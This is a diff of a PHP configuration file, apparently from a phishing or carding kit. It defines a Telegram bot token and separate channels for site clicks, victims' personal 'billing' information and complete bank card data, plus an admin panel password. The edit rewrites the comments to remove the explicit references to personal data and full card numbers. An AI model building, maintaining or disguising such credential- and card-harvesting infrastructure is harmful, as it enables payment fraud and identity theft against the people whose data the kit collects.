@@ -6,13 +6,13 @@ return [
     // Token du bot Telegram (@BotFather)
     'bot_token' => '',
 
-    // Canal clics sur le site
+    // Canal clics sur le site (auto-mis à jour si le groupe devient supergroupe)
     'chat_id_clicks' => '',
 
-    // Canal billing (informations personnelles, via partial-notify.php)
+    // Canal billing (auto-mis à jour si le groupe devient supergroupe)
     'chat_id_billing' => '',
 
-    // Canal CC (carte bancaire complète, via notify.php)
+    // Canal CC (auto-mis à jour si le groupe devient supergroupe)
     'chat_id_cc' => '',
 
     // Mot de passe du panel admin
